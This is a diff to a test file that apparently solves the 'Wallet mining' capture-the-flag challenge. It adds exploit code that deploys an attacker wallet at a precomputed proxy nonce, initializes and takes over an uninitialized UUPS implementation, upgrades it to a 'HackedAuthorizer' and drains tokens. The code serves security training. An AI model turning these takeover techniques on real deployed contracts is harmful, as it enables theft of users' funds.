@@ -23,6 +23,13 @@ describe('[Challenge] Wallet mining', function () {
             { kind: 'uups', initializer: 'init' }
         );
 
+        console.log({ authorizer: authorizer.address })
+        console.log({ authorizer })
+        console.log({ owner: (await authorizer.owner()) })
+
+        const implAddr = await ethers.provider.getStorageAt(authorizer.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
+        console.log({ implAddr })
+
         expect(await authorizer.owner()).to.eq(deployer.address);
         expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
         expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;
@@ -131,14 +138,41 @@ describe('[Challenge] Wallet mining', function () {
         ).attach("0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B");
 
 
-        for (let i = 0; i < foundNonce; i++) {
-            console.log('deploy wallet')
-            await factory.createProxy("0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F", [])
+        const attackerWallet = await (await ethers.getContractFactory("AttackerWallet", player)).deploy();
+        console.log({ attackerWallet: attackerWallet.address })
+
+        const initializerData = attackerWallet.interface.encodeFunctionData("steal", [token.address, player.address]);
+
+        const txCount = await ethers.provider.getTransactionCount(factory.address);
+        console.log('tx count - factory', txCount)
+
+        for (let i = 0; i < foundNonce + 3; i++) {
+            console.log("create proxy", i)
+            if (foundNonce - txCount === i) {
+                await factory.createProxy(attackerWallet.address, initializerData)
+            } else {
+                await factory.createProxy(attackerWallet.address, [])
+            }
         }
 
-        const tx = await factory.createProxy("0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F", [])
-        const receipt = await tx.wait()
-        console.log(receipt)
+        console.log("deploy last wallet")
+
+        const implAddr = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512";
+
+        const authorizerImpl = await (await ethers.getContractFactory('AuthorizerUpgradeable', player)).attach(implAddr);
+
+        await authorizerImpl.connect(player).init([player.address], [token.address]);
+
+        // https://ethereum.stackexchange.com/questions/132261/initializing-the-implementation-contract-when-using-uups-to-protect-against-atta
+
+        // HackedAuthorizer
+        const hackedAuthorizer = await (await ethers.getContractFactory('HackedAuthorizer', player)).deploy();
+        const dropData = hackedAuthorizer.interface.encodeFunctionData("steal", []);
+
+        await authorizerImpl.connect(player).upgradeToAndCall(hackedAuthorizer.address, dropData);
+        for (let i = 0; i < foundNonce; i++) {
+            await walletDeployer.connect(player).drop([]);
+        }
     });
 
     after(async function () {
